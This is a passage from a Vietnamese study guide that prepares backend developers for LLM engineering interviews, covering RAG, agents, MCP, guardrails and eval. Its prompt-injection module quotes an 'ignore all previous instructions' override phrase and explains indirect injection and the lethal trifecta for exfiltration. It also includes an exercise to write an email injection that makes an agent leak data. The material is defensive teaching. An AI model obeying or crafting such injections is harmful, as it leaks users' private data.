- Circuit breaker, graceful degradation: [18-reliability-observability.md](18-reliability-observability.md)

*LLM gateway*
- *LLM gateway* là một lớp trung gian mà mọi lời gọi LLM trong công ty đi qua.
- Trách nhiệm:
  - Routing và fallback tập trung.
  - Quota và ngân sách theo team hoặc tenant.
  - Giữ API key của provider ở một chỗ, app không cầm key thật.
  - Log, trace, tính chi phí theo feature.
  - Cache, che PII, guardrail.
- Cách có: tự viết, dùng mã nguồn mở (ví dụ LiteLLM), hoặc dùng gateway của cloud.
- ⚠️ Gateway thành *SPOF* (single point of failure: nó chết là mọi tính năng AI chết) và thêm
  latency. Cần HA (chạy nhiều bản, một bản chết vẫn còn bản khác) và timeout riêng.

**Đọc**
- [LiteLLM docs](https://docs.litellm.ai/): phần proxy (routing, fallback, budget) để thấy một gateway làm những gì
- Anthropic: [Building effective agents](https://www.anthropic.com/engineering/building-effective-agents) (pattern *routing*)

**Nắm chắc khi**
- [ ] Viết được interface adapter có timeout, retry, fallback, ghi token và chi phí (bài tập 2)
- [ ] Nêu được 5 trách nhiệm của LLM gateway và cái giá của việc thêm nó

#### 2.5 RAG: luồng, chunking, embedding, vector store

**Vì sao cần học:** RAG là kiến trúc phổ biến nhất khi đưa dữ liệu công ty vào LLM: chatbot hỏi
đáp tài liệu nội bộ, trợ lý hỗ trợ khách hàng. Phần lớn công việc nằm ở ingest dữ liệu, lưu
vector và lọc quyền, tức là việc quen thuộc của backend. Câu hay hỏi: "vì sao RAG mà không
fine-tune" và "hệ thống đang dùng MySQL thì lưu vector ở đâu".

**Học gì**

*RAG là gì*
- *RAG* (retrieval-augmented generation): trước khi hỏi model, tìm các đoạn tài liệu liên quan
  tới câu hỏi rồi đưa vào prompt. Model trả lời dựa trên các đoạn đó.
- Luồng ingest (chạy nền khi tài liệu được thêm hoặc sửa):
  1. Lấy tài liệu, làm sạch.
  2. Chia thành các *chunk* (đoạn nhỏ).
  3. Tính *embedding* cho từng chunk (giải thích ở dưới).
  4. Lưu vector + text + metadata, trong đó có *ACL* (danh sách ai được xem).
- Luồng query (mỗi câu hỏi):
  1. (Tuỳ chọn) viết lại câu hỏi cho rõ.
  2. Tính embedding của câu hỏi.
  3. Tìm top-K chunk gần nhất, **lọc theo quyền** của user.
  4. (Tuỳ chọn) *rerank* (module 2.6).
  5. Ghép các chunk vào prompt, model trả lời kèm trích dẫn.

*Vì sao chọn RAG*

| So với | Lý do chọn RAG |
|---|---|
| Nhồi hết dữ liệu vào prompt | Context có giới hạn. Chi phí tính theo token. Dữ liệu đổi thường xuyên. Cần trích dẫn và lọc quyền |
| *Fine-tune* (huấn luyện thêm model bằng dữ liệu của mình) để thêm kiến thức | Cập nhật chỉ cần re-index. Xoá được dữ liệu. Kiểm soát quyền theo từng tài liệu |

*Chunking*
- Chunk to quá thì nhiễu, tốn token, và embedding bị "loãng" (một vector phải đại diện cho quá
  nhiều ý).
- Chunk nhỏ quá thì mất ngữ cảnh.
- Chia theo cấu trúc: heading, mục trong hợp đồng, hàm trong code.
- Có *overlap*: hai chunk liền nhau lặp lại một phần, để một ý không bị cắt đôi.
- Gắn metadata: nguồn, tiêu đề mục, ngày cập nhật, tenant, ACL.
- *Contextual retrieval*: thêm ngữ cảnh của tài liệu vào từng chunk trước khi embed.
  - Ví dụ: chunk "Phí phạt là 2%" được thêm "Trích hợp đồng thuê kho, mục Chấm dứt hợp đồng" để
    không bị lạc nghĩa.
- ⚠️ Bảng, PDF scan, tài liệu nhiều cột: khâu trích text thường hỏng đầu tiên.

*Embedding*
- *Embedding*: một model biến văn bản thành một vector (một dãy số). Văn bản gần nghĩa thì vector
  gần nhau.
  - Ví dụ: "hoàn tiền" và "trả lại tiền" khác chữ nhưng cho hai vector gần nhau.
- Ba cách đo độ gần:
  - *Cosine*: dựa trên góc giữa hai vector.
  - *Dot product*: bằng cosine nếu vector đã được chuẩn hoá (độ dài bằng 1).
  - *L2*: khoảng cách thẳng giữa hai điểm.
- ⚠️ Vector của hai model embedding khác nhau không so sánh được với nhau, giống hai hệ toạ độ
  khác nhau. Lưu tên và phiên bản model cạnh vector.
- ⚠️ Kiểm tra model embedding có tốt với tiếng Việt không.

*Vector store*
- pgvector là extension của PostgreSQL, có index HNSW và IVFFlat (module 3.5):
  - Dữ liệu và vector nằm cùng DB, lọc bằng SQL, transaction chung.
  - Hợp quy mô vừa.
- Stack MySQL: MySQL 8.4 LTS không có kiểu vector. Thường thêm một trong các lựa chọn:
  - Postgres + pgvector.
  - OpenSearch/Elasticsearch.
  - Vector DB riêng.
- Vector DB chuyên dụng:
  - Hợp quy mô lớn, nhiều tính năng.
  - Thêm một hệ thống phải đồng bộ và vận hành ([04-nosql-search-storage.md](04-nosql-search-storage.md)).

**Đọc**
- Bài gốc: [Lewis et al., Retrieval-Augmented Generation](https://arxiv.org/abs/2005.11401) (đọc abstract và phần 2)
- Anthropic: [Contextual Retrieval](https://www.anthropic.com/news/contextual-retrieval): kỹ thuật thêm ngữ cảnh vào chunk, có số đo trước/sau
- [pgvector](https://github.com/pgvector/pgvector): README, phần HNSW, IVFFlat, filtering
- Laravel AI SDK: [AI SDK](https://laravel.com/docs/ai-sdk) (phần embedding)

**Nắm chắc khi**
- [ ] Tự dựng được RAG nhỏ trên pgvector với 50 tài liệu thật, trả lời có trích dẫn
- [ ] Giải thích được vì sao đổi model embedding bắt buộc embed lại toàn bộ
- [ ] Bảo vệ được lựa chọn vector store cho hệ thống đang dùng MySQL (bài tập 5)

#### 2.6 Hybrid search, rerank và cập nhật index

**Vì sao cần học:** RAG chỉ dùng vector search thường trả lời sai với câu hỏi chứa mã đơn hàng
hay tên riêng. Còn phần khó nhất khi vận hành RAG là giữ index đồng bộ với dữ liệu gốc: tài liệu
đã bị xoá hay đổi quyền mà vector vẫn còn là một sự cố bảo mật.

**Học gì**

*Hybrid search*
- Vector search giỏi tìm theo nghĩa, nhưng kém với mã sản phẩm, tên riêng, số hợp đồng, từ hiếm.
- *BM25* là cách chấm điểm theo từ khoá của search engine truyền thống (Elasticsearch,
  OpenSearch): từ xuất hiện càng nhiều và càng hiếm thì điểm càng cao. BM25 làm tốt đúng phần
  vector search làm kém.
- *Hybrid search*: chạy cả hai loại tìm kiếm, rồi gộp kết quả.
- Gộp bằng *Reciprocal Rank Fusion* (RRF): cộng điểm theo **thứ hạng**, không theo điểm gốc, vì
  điểm BM25 và điểm vector không cùng thang.
  - Mỗi danh sách cho tài liệu d điểm `1 / (k + hạng của d)`, với k là hằng số (bài gốc dùng
    60). Cộng điểm từ các danh sách lại.
  - Ví dụ: tài liệu đứng hạng 1 ở BM25 và hạng 3 ở vector được `1/61 + 1/63`.

*Rerank*
- Lấy vài chục ứng viên từ bước tìm kiếm.
- Dùng *cross-encoder* (model đọc cùng lúc câu hỏi và từng chunk rồi chấm độ liên quan) chấm lại.
- Giữ vài chunk tốt nhất.
- Kết quả tốt hơn, đổi lại thêm latency và chi phí.

*Cập nhật index khi dữ liệu đổi*
- Nguồn thay đổi: event (outbox, CDC) hoặc job đồng bộ theo `updated_at`
  ([12-messaging.md](12-messaging.md)).
  - *Outbox*: ghi event vào một bảng trong cùng transaction với dữ liệu, rồi một tiến trình khác
    đẩy event đi.
  - *CDC* (change data capture): đọc thay đổi trực tiếp từ log của DB (binlog của MySQL).
- Khi sửa tài liệu:
  1. Xoá mọi chunk cũ theo document id.
  2. Thêm chunk mới.
  3. Chỉ embed lại khi hash nội dung khác trước.
- ⚠️ Xoá tài liệu (hoặc user yêu cầu xoá dữ liệu cá nhân) mà quên xoá vector thì dữ liệu vẫn
  xuất hiện trong câu trả lời.
- ⚠️ Quyền thay đổi (user bị rút quyền, tài liệu chuyển thành private) cũng phải cập nhật
  metadata ACL.
- Re-index toàn bộ (đổi model embedding, đổi cách chunk): build index mới song song rồi chuyển
  sang, như đổi alias trong search engine (*alias* là một tên trỏ tới index thật, đổi sang
  index mới chỉ trong một bước).

**Đọc**
- [Cormack et al., Reciprocal Rank Fusion](https://plg.uwaterloo.ca/~gvcormac/cormacksigir09-rrf.pdf) (bài ngắn, 2 trang)
- Elasticsearch: [Reciprocal rank fusion](https://www.elastic.co/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion)
- Anthropic: [Contextual Retrieval](https://www.anthropic.com/news/contextual-retrieval) (phần kết hợp BM25 và rerank)

**Nắm chắc khi**
- [ ] Tính tay được điểm RRF của 3 tài liệu từ hai danh sách xếp hạng
- [ ] Thiết kế được luồng đồng bộ index khi tài liệu bị xoá hoặc đổi quyền, và chỉ ra chỗ có thể lệch

#### 2.7 Agent và workflow

**Vì sao cần học:** "Agent" là từ khoá nóng, và người phỏng vấn senior muốn nghe bạn biết khi
nào **không** dùng agent. Agent không giới hạn là cách nhanh nhất để đốt tiền, hoặc để model tự
ý hoàn tiền cho khách. Câu hay hỏi: "workflow hay agent" và "đặt giới hạn gì cho agent".

**Học gì**

*Vòng lặp tool*
- *Agent* là model được gọi lặp đi lặp lại: mỗi vòng nó tự chọn tool tiếp theo, cho tới khi xong
  việc. Khung vòng lặp:

  ```
  loop (tối đa N bước, T giây, C chi phí):
      resp = llm(messages, tools)
      if resp.stop_reason != tool_use: return resp
      for call in resp.tool_calls:
          kiểm quyền + validate tham số
          result = run_tool(call)        // có timeout
          messages.append(result)
  ```

*Workflow hay agent*

| | Workflow | Agent |
|---|---|---|
| Ai quyết định chuỗi bước | Code | LLM tự chọn bước tiếp |
| LLM làm gì | Làm từng bước được giao | Vừa chọn bước vừa làm |
| Dễ đoán, dễ test | Có | Khó |
| Chi phí | Rẻ hơn | Đắt hơn và khó đoán |
| Hợp khi | Các bước biết trước | Thật sự không biết trước cần bước nào |

- Câu trả lời senior thường là "bắt đầu bằng workflow".

*Giới hạn*
- ⚠️ Giới hạn số bước, tổng thời gian, tổng token hoặc chi phí, và số lần gọi mỗi tool.
- Không giới hạn thì vòng lặp lỗi (tool trả lỗi, model gọi lại mãi) đốt tiền không dừng. OWASP
  xếp rủi ro này là LLM10 Unbounded Consumption.

*Hành động không đảo ngược được*
- *Human-in-the-loop*: với hành động không đảo ngược được (gửi email cho khách, hoàn tiền, xoá dữ
  liệu, deploy):
  1. Agent chỉ tạo đề xuất.
  2. Lưu trạng thái chờ duyệt, không giữ request mở.
  3. Người duyệt thì hệ thống mới thực thi.
  4. Đề xuất có timeout, và mọi bước có audit log.
- ⚠️ Idempotency: tool tạo đơn hay chuyển tiền nhận một *idempotency key*, để gọi hai lần cũng
  chỉ có kết quả như một lần ([09-api-design.md](09-api-design.md)).

*Tác vụ dài*
- Chạy như job nền có trạng thái.
- Có *checkpoint* (lưu tiến độ sau mỗi bước), để tiếp tục được sau crash.
- Không chạy trong một HTTP request.

**Đọc**
- Anthropic: [Building effective agents](https://www.anthropic.com/engineering/building-effective-agents): **đọc hết**
- OWASP: LLM06 Excessive Agency và LLM10 Unbounded Consumption trong [Top 10](https://genai.owasp.org/llm-top-10/)

**Nắm chắc khi**
- [ ] Viết được vòng lặp tool có đủ ba giới hạn và xử lý tool lỗi
- [ ] Với agent có `search_orders`, `refund_order`, `send_email`, đặt được giới hạn và kiểm soát cho từng tool (bài tập 4)

#### 2.8 Model Context Protocol (MCP)

**Vì sao cần học:** MCP đang thành cách chuẩn để trợ lý AI (IDE, chat nội bộ) gọi vào hệ thống
của công ty. Backend có thể được giao việc "mở API cho agent dùng", và phải biết rủi ro khi cài
MCP server của bên thứ ba. Red flag hay gặp: "MCP thay cho REST API".

**Học gì**

*MCP là gì*
- *MCP* (Model Context Protocol) là chuẩn mở để ứng dụng LLM kết nối với các server cung cấp
  khả năng, thay vì mỗi ứng dụng tự viết tích hợp riêng.
- Các vai:
  - *Host/client*: ứng dụng LLM, ví dụ IDE hoặc trợ lý chat.
  - *Server*: chương trình cung cấp ba loại thứ:
    - Tool: hành động gọi được.
    - Resource: dữ liệu đọc được.
    - Prompt: mẫu prompt dựng sẵn.
- So với tool use (module 1.3): tool use là cơ chế model xin gọi hàm. MCP là chuẩn để đóng gói
  các tool đó thành server, để nhiều ứng dụng dùng lại được.

*Giao thức*
- Dùng *JSON-RPC*: request và response dạng JSON, có `method` và `params`.
- Hai transport:
  - stdio: server chạy local như một process con, nói chuyện qua stdin/stdout.
  - Streamable HTTP: server chạy từ xa, qua HTTP.
- Server từ xa dùng authorization dựa trên OAuth.

*Góc backend*
- Công ty có thể **mở API của mình dưới dạng MCP server** để agent (IDE, trợ lý nội bộ) gọi
  được.
- Server đó phải áp cùng authn/authz, rate limit, audit như API công khai.
- PHP: có SDK MCP chính thức cho PHP (PHP Foundation phối hợp với Symfony). Laravel có Laravel
  MCP để viết MCP server trong Laravel.

*Rủi ro*
- ⚠️ *Tool poisoning*: mô tả tool của server bên thứ ba có thể chứa chỉ thị độc. Mô tả tool cũng
  là input không tin cậy.
- ⚠️ Server có quá nhiều quyền.
- ⚠️ *Confused deputy*: server dùng credential của chính nó (quyền rộng) thay cho quyền của user,
  nên user làm được việc vượt quyền của mình.
- ⚠️ *Token passthrough*: server nhận token của user rồi chuyển tiếp nguyên sang API khác. Spec
  cấm việc này.
- ⚠️ Cài một MCP server lạ là chạy code lạ: rủi ro supply chain như mọi dependency.

**Đọc**
- [MCP: Introduction](https://modelcontextprotocol.io/docs/getting-started/intro), [Architecture](https://modelcontextprotocol.io/docs/learn/architecture), [Specification](https://modelcontextprotocol.io/specification/latest) (lướt phần *Base Protocol* và *Transports*)
- MCP: [Security Best Practices](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices): **đọc hết**
- PHP: [Announcing the Official PHP SDK for MCP](https://thephp.foundation/blog/2025/09/05/php-mcp-sdk/), [modelcontextprotocol/php-sdk](https://github.com/modelcontextprotocol/php-sdk); Laravel: [MCP](https://laravel.com/docs/mcp)
- Anthropic: [MCP connector](https://platform.claude.com/docs/en/agents-and-tools/mcp-connector) (gọi MCP server từ xa thẳng qua API)

**Nắm chắc khi**
- [ ] Giải thích được MCP khác tool use thông thường ở đâu, và khi nào không cần MCP
- [ ] Viết được một MCP server nhỏ (PHP hoặc Laravel) mở 2 tool đọc dữ liệu, có kiểm quyền theo user
- [ ] Liệt kê được 4 rủi ro khi cho agent nội bộ dùng MCP server bên thứ ba và cách giảm

#### 2.9 Log, theo dõi production, version prompt

**Vì sao cần học:** Khi user phàn nàn "bot trả lời sai", không có log đầy đủ thì không có cách
nào biết vì sao. Chất lượng còn có thể giảm mà không có lỗi nào. Module này nối kiến thức
observability quen thuộc với các đặc thù của LLM.

**Học gì**

*Log gì cho mỗi lời gọi*
- Prompt và response.
- Model, tham số.
- Số token, kể cả token cache và reasoning.
- Latency, chi phí.
- Stop reason, tool call.
- Gắn *trace id* với request gốc.
- Không có log thì không debug được câu trả lời sai.
- ⚠️ Prompt và response chứa *PII* (thông tin định danh cá nhân: tên, số điện thoại, email...).
  - Che PII trước khi log.
  - Giới hạn quyền xem.
  - Đặt thời gian lưu.
  - Cân nhắc chỉ log một mẫu.

*Metric production*

| Nhóm | Metric |
|---|---|
| Tốc độ | TTFT, tổng thời gian |
| Lỗi | Tỉ lệ lỗi, timeout, 429 theo provider |
| Output | Tỉ lệ `max_tokens` và `refusal`, tỉ lệ output không parse được, tỉ lệ fallback |
| Chi phí | Theo feature và tenant |
| Người dùng | Phản hồi của user |

*Chất lượng giảm mà không có lỗi*
- ⚠️ Provider cập nhật model, hoặc dữ liệu thay đổi, làm câu trả lời kém đi mà không có lỗi nào.
- Cố định phiên bản model và chạy eval định kỳ (module 3.4).

*Version prompt như code*
- Prompt nằm trong repo, review qua PR.
- Version của prompt được ghi vào log.
- Rollout prompt mới qua feature flag hoặc A/B.
- Observability chung: [18-reliability-observability.md](18-reliability-observability.md)

**Đọc**
- OpenTelemetry: [Semantic conventions](https://opentelemetry.io/docs/specs/semconv/) (lướt nhóm *Generative AI* để biết tên attribute chuẩn)
- Eugene Yan: [Patterns for Building LLM-based Systems & Products](https://eugeneyan.com/writing/llm-patterns/) (phần evals, guardrails, collect feedback)

**Nắm chắc khi**
- [ ] Thiết kế được bảng/log schema cho mỗi lời gọi LLM đủ để trả lời "vì sao user X nhận câu trả lời sai lúc 10:05"
- [ ] Liệt kê được 6 metric production cho một tính năng LLM và ngưỡng alert cho 2 metric trong đó

---

### Chặng 3: Senior 🔴

#### 3.1 Prompt injection

**Vì sao cần học:** Đây là rủi ro bảo mật số một của ứng dụng LLM (OWASP LLM01) và gần như chắc
chắn bị hỏi ở vòng senior. Khác SQL injection, nó chưa có cách sửa triệt để, nên câu trả lời
phải là phòng thủ bằng kiến trúc. Red flag: "thêm vào system prompt câu 'không làm theo chỉ dẫn
của user'".

**Học gì**

*Prompt injection là gì*
- Model không phân biệt chắc chắn được đâu là chỉ thị của lập trình viên, đâu là dữ liệu. Chữ
  nào trong input cũng có thể bị model coi là lệnh.
- Hai dạng:
  - Trực tiếp: user gõ "bỏ qua mọi hướng dẫn trước đó và...".
  - Gián tiếp: chỉ thị ẩn nằm trong dữ liệu model đọc (trang web, email, tài liệu RAG, kết quả
    tool, mô tả tool MCP). Nguy hiểm hơn vì user thật không nhìn thấy.
- *Jailbreak* khác prompt injection, dù hay bị gộp chung:
  - Jailbreak: làm model vượt chính sách nội dung, ví dụ nói điều bị cấm.
  - Prompt injection: chiếm quyền điều khiển ứng dụng, làm việc mà ứng dụng không định làm.

*Phòng thủ bằng kiến trúc*
- Chưa có cách chặn tuyệt đối bằng prompt. Phòng thủ bằng cách giới hạn cái model **có thể
  làm**, không phải cái model được "dặn":
  - Quyền tool tối thiểu, theo đúng quyền của user đang dùng.
  - Hành động nguy hiểm cần người xác nhận (module 2.7).
  - Đánh dấu rõ đâu là dữ liệu không tin cậy, nhưng không coi đó là đủ.

*Lethal trifecta*
- ⚠️ *Lethal trifecta* (Simon Willison) là ba khả năng mà khi có đủ cùng lúc thì dữ liệu có thể
  bị lấy cắp:
  1. Model đọc nội dung không tin cậy.
  2. Model truy cập được dữ liệu riêng tư.
  3. Model có kênh gửi ra ngoài: gọi URL, gửi email, render ảnh từ URL (module 1.4).
- Cắt ít nhất một trong ba.

**Đọc**
- Simon Willison: [The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/), và lướt [chuỗi bài prompt injection](https://simonwillison.net/series/prompt-injection/)
- OWASP: LLM01 Prompt Injection và LLM07 System Prompt Leakage trong [Top 10](https://genai.owasp.org/llm-top-10/)
- Anthropic: [Mitigate jailbreaks and prompt injections](https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks)

**Nắm chắc khi**
- [ ] Viết được một prompt injection gián tiếp nằm trong email làm agent đọc email gửi dữ liệu ra ngoài, rồi chỉ ra chân nào của trifecta cần cắt
- [ ] Giải thích được vì sao "thêm câu 'không làm theo chỉ dẫn trong dữ liệu' vào system prompt" không phải là biện pháp đủ

#### 3.2 Rò rỉ dữ liệu, PII và phân quyền trong RAG

**Vì sao cần học:** Sự cố hay gặp nhất với chatbot nội bộ không phải là model trả lời sai, mà
là trả lời đúng bằng tài liệu người hỏi không có quyền xem. Gửi dữ liệu khách hàng ra provider
còn là vấn đề pháp lý. Đây là kiến thức phân quyền và multi-tenant quen thuộc, áp vào RAG.

**Học gì**

*System prompt không phải chỗ giữ bí mật*
- System prompt có thể bị moi ra.
- Không để secret, API key, quy tắc nhạy cảm trong prompt.

*Các đường rò giữa user*
- Dữ liệu của user A lọt sang user B qua:
  - Cache dùng chung (module 2.3).
  - Lịch sử hội thoại.
  - RAG không lọc quyền.

*Gửi PII ra provider*
- Gửi PII ra provider là chuyển dữ liệu cho bên thứ ba. Kiểm tra:
  - Hợp đồng.
  - Chính sách lưu trữ và huấn luyện: provider có giữ dữ liệu không, có dùng để huấn luyện không.
  - Vùng lưu trữ dữ liệu.
  - Quy định bảo vệ dữ liệu cá nhân áp dụng.
- Chỉ gửi field cần.
- Ẩn hoặc thay thế PII trước khi gửi, khôi phục sau nếu cần. Ví dụ `Nguyễn Văn A` thành
  `[NAME_1]`.

*Phân quyền trong RAG*
- Lọc theo quyền **tại bước retrieval**, bằng metadata ACL/tenant trong câu truy vấn. Không bao
  giờ lấy mọi chunk rồi "dặn" model đừng tiết lộ.

  ```sql
  SELECT id, content
  FROM chunks
  WHERE tenant_id = :tenant_id
    AND acl_group = ANY(:user_groups)
  ORDER BY embedding <=> :query_vector      -- <=> là khoảng cách cosine của pgvector
  LIMIT 5;
  ```
- Quyền phải được đồng bộ khi thay đổi (module 2.6).
- Multi-tenant:
  - Tách index hoặc namespace theo tenant.
  - Hoặc bắt buộc filter tenant ở lớp truy cập dữ liệu, để không ai quên được. Trong Laravel,
    ví dụ một global scope của Eloquent luôn thêm điều kiện tenant.
- OWASP LLM08 Vector and Embedding Weaknesses:
  - Dữ liệu độc được đưa vào index.
  - Dữ liệu rò giữa các tenant.

**Đọc**
- OWASP: LLM02 Sensitive Information Disclosure và LLM08 Vector and Embedding Weaknesses trong [Top 10](https://genai.owasp.org/llm-top-10/)
- Bảo mật chung và dữ liệu cá nhân: [10-security.md](10-security.md)

**Nắm chắc khi**
- [ ] Chỉ ra được 3 điểm rò dữ liệu trong sơ đồ "hỏi đáp tài liệu nội bộ" (bài tập 1)
- [ ] Viết được query vector có filter tenant và ACL mà code gọi không thể quên truyền

#### 3.3 Guardrail và moderation

**Vì sao cần học:** Chatbot hướng tới khách hàng cần một lớp chặn nội dung độc hại, câu hỏi lạc
chủ đề và PII. Người phỏng vấn muốn nghe bạn cân được lợi ích của guardrail với latency, chi phí
và chặn nhầm, và biết guardrail không thay được phòng thủ kiến trúc.

**Học gì**

*Guardrail là gì*
- *Guardrail* là lớp kiểm tra thêm quanh lời gọi LLM. Nó **không thay** phòng thủ kiến trúc ở
  module 3.1.
- Luồng:
  1. Kiểm input.
  2. Gọi LLM.
  3. Kiểm output.
  4. Trả kết quả cho user.

*Kiểm gì*

| Chỗ | Kiểm gì |
|---|---|
| Input | Phát hiện injection/jailbreak, chủ đề ngoài phạm vi, PII, giới hạn độ dài |
| Output | PII, nội dung độc hại, vi phạm chính sách, *grounding* (câu trả lời có bám vào nguồn được đưa không), đúng schema |

*Công cụ*
- Moderation API của provider.
- Model phân loại nhỏ.
- Rule: regex, allowlist, blocklist.
- *LLM-as-judge* (dùng một lời gọi LLM khác để chấm) cho kiểm tra phức tạp.

*Cái giá và cạm bẫy*
- ⚠️ Mỗi lớp kiểm tra thêm latency và chi phí.
- ⚠️ *False positive* (chặn nhầm câu hợp lệ) làm hỏng trải nghiệm. Đo cả latency và false
  positive.
- ⚠️ Với streaming, kiểm output sau khi đã gửi là quá muộn. Kiểm theo từng đoạn, hoặc không
  stream.
- Xử lý `refusal` của model như một kết quả hợp lệ có nhánh riêng, không coi là lỗi hệ thống.

**Đọc**
- OpenAI: [Moderation](https://developers.openai.com/api/docs/guides/moderation)
- Anthropic: [Mitigate jailbreaks and prompt injections](https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks) và các trang cùng mục *Strengthen guardrails*
- Eugene Yan: [Patterns for Building LLM-based Systems](https://eugeneyan.com/writing/llm-patterns/) (phần guardrails)

**Nắm chắc khi**
- [ ] Thiết kế được pipeline guardrail cho chatbot hỗ trợ khách hàng: kiểm gì ở input, gì ở output, và latency cộng thêm
- [ ] Giải thích được vì sao guardrail phát hiện injection không thay được quyền tool tối thiểu

#### 3.4 Eval

**Vì sao cần học:** Không có eval thì mỗi lần đổi prompt hay model là đoán mò. Eval là "test
suite" của phần LLM, và câu "bạn đo chất lượng hệ RAG thế nào" rất hay gặp ở vòng senior. Đây
cũng là chỗ kỹ năng testing sẵn có của dev backend dùng được ngay.

**Học gì**

*Vì sao không assert chuỗi*
- Output không tất định, nên không test bằng assert chuỗi chính xác.
- Thay bằng *eval set*: bộ test offline gồm input thật (đã ẩn danh) kèm tiêu chí chấm.

*Cách chấm*

| Cách | Hợp khi | Lưu ý |
|---|---|---|
| Kiểm tra có cấu trúc | JSON hợp lệ, field đúng, có trích dẫn | Rẻ và nhanh |
| So với đáp án chuẩn | Có đáp án đúng rõ ràng (phân loại, trích xuất) | |
| LLM-as-judge theo *rubric* (bảng tiêu chí chấm) | Câu trả lời tự do | ⚠️ Judge cũng phải được kiểm chứng so với người chấm |
| Người đánh giá | Trên một mẫu | Chậm và tốn công |

*Khi nào chạy*
- Chạy eval như regression test mỗi khi đổi prompt, model, cách chunk
  ([20-testing-quality.md](20-testing-quality.md)).
- Đưa ca hỏng từ production vào eval set.
- Theo dõi điểm theo thời gian.

*Eval RAG: tách hai tầng*
- Retrieval: có tìm đúng chunk không. Đo trên bộ câu hỏi biết trước đáp án:
  - *recall@K*: trong các chunk đúng, bao nhiêu phần nằm trong top-K. Ví dụ câu hỏi có 2 chunk
    đúng, top-5 chứa 1 thì recall@5 là 0.5.
  - *MRR* (mean reciprocal rank): trung bình của 1 / hạng của kết quả đúng đầu tiên. Đúng ở hạng
    1 được 1, hạng 2 được 0.5.
- Generation: câu trả lời có đúng, có bám nguồn, có bịa không.
- ⚠️ Câu trả lời sai thường do retrieval sai. Đo retrieval trước.

*Test code quanh LLM*
- Code quanh LLM (parse, validate, tool, retry, stop reason) vẫn test bình thường.
- Dùng fake LLM trả output định sẵn, kể cả output hỏng và output bị cắt.

**Đọc**
- Anthropic: [Define success criteria and build evaluations](https://platform.claude.com/docs/en/test-and-evaluate/develop-tests)
- OpenAI: [Evals](https://developers.openai.com/api/docs/guides/evals)
- Hamel Husain: [Your AI Product Needs Evals](https://hamel.dev/blog/posts/evals/)
- *AI Engineering* (Chip Huyen): các chương về evaluation

**Nắm chắc khi**
- [ ] Viết được eval set 10 câu cho chatbot hỗ trợ khách hàng, mỗi câu có tiêu chí chấm (bài tập 3)
- [ ] Đo được recall@5 của hệ RAG ở module 2.5 trước và sau khi thêm hybrid search
- [ ] Viết được unit test cho adapter với fake trả JSON hỏng và `max_tokens`

#### 3.5 Bên trong vector search

**Vì sao cần học:** Khi RAG chậm hoặc trả thiếu kết quả, nguyên nhân thường nằm trong index
vector. Senior cần giải thích được đánh đổi recall lấy tốc độ và bẫy khi lọc theo tenant, giống
như cần hiểu B+tree để tối ưu SQL.

**Học gì**

*Vì sao cần tìm xấp xỉ*
- Tìm chính xác phải so câu hỏi với mọi vector: O(n·d), với n là số vector và d là số chiều của
  mỗi vector. Không chịu được khi n lớn.
  - Ví dụ: 1 triệu vector, mỗi vector 1.000 chiều, là khoảng 1 tỷ phép nhân cho mỗi query.
- *ANN* (approximate nearest neighbor): tìm xấp xỉ, nhanh hơn nhiều, đổi lại có thể bỏ sót vài
  kết quả gần nhất.
- *Recall* ở đây là tỉ lệ kết quả đúng (theo tìm chính xác) mà ANN tìm được.

*HNSW*
- *HNSW* là đồ thị nhiều tầng. Tầng trên ít node, các cạnh nối xa. Tầng dưới đủ mọi node, các
  cạnh nối gần. Giống đi từ bản đồ quốc gia xuống bản đồ phố.
- Cách tìm:
  1. Bắt đầu ở tầng trên cùng, đi *tham lam*: luôn nhảy sang node kề gần câu hỏi hơn, tới khi
     không gần hơn được nữa.
  2. Xuống tầng dưới, tiếp tục từ node đó.
  3. Tới tầng dưới cùng thì lấy các node gần nhất làm kết quả.
- Đặc điểm: recall cao, query nhanh, tốn RAM, build chậm.
- Tham số đánh đổi recall lấy tốc độ:
  - `m`: số cạnh của mỗi node.
  - `ef_construction`: độ rộng tìm kiếm khi build index.
  - `ef_search`: độ rộng tìm kiếm khi query. Tăng thì recall cao hơn nhưng chậm hơn.

*IVF*
- *IVF* chia vector thành các cụm, mỗi cụm có một tâm. Query chỉ tìm trong vài cụm có tâm gần
  nhất (số cụm quét là `probes`).
- So với HNSW:

  | | HNSW | IVF |
  |---|---|---|
  | Bộ nhớ | Tốn RAM | Nhẹ hơn |
  | Recall | Cao | Phụ thuộc số cụm quét |
  | Build | Chậm | Cần build sau khi đã có dữ liệu, để tính tâm cụm |

*Lọc metadata kết hợp ANN*
- ⚠️ Lọc sau khi đã lấy top-K có thể còn quá ít kết quả. Chuỗi sự cố:
  1. Query `WHERE tenant_id = 7 ORDER BY embedding <=> :q LIMIT 10`.
  2. Index trả về một nhóm ứng viên gần nhất trên **toàn bộ** dữ liệu, của mọi tenant.
  3. Sau đó mới lọc tenant: chỉ 2 ứng viên thuộc tenant 7.
  4. Kết quả trả về 2 dòng dù `LIMIT 10`.
- Cách sửa:
  - Dùng hệ thống lọc ngay trong lúc tìm.
  - Lấy K lớn hơn.
  - Dùng iterative scan (pgvector 0.8+).

*Quantization*
- *Quantization*: giảm độ chính xác của từng số trong vector để tiết kiệm RAM, đổi lại recall
  giảm.

**Đọc**
- Bài gốc: [Malkov, Yashunin: HNSW](https://arxiv.org/abs/1603.09320) (đọc phần 1, 3 và hình minh hoạ)
- [pgvector](https://github.com/pgvector/pgvector): mục HNSW, IVFFlat, *Iterative Index Scans*

**Nắm chắc khi**
- [ ] Vẽ được cách HNSW tìm một vector qua ba tầng
- [ ] Đo được recall và latency của pgvector HNSW khi đổi `ef_search`, trên tập dữ liệu của chính mình
- [ ] Giải thích được vì sao query có filter tenant trả về 2 kết quả dù `LIMIT 10`

---

## Phần 2: Câu hỏi thường gặp (bonus)

Cách dùng: tự trả lời thành tiếng trước, sau đó mới đối chiếu với hướng trả lời. Câu nào bị
đơ thì quay lại module ghi trong ngoặc.

### 🟢 Junior

**1. Vì sao không nên gọi LLM API đồng bộ trong request web với timeout mặc định?** (1.2, 2.2)
- Ý phải có: chậm và thời gian khó đoán; giữ worker/thread; timeout mặc định có thể quá ngắn hoặc vô hạn
- Điểm cộng: con số cụ thể về FPM pool bị cạn; queue job + `202 Accepted`

**2. Chi phí một lời gọi LLM tính thế nào?** (1.1)
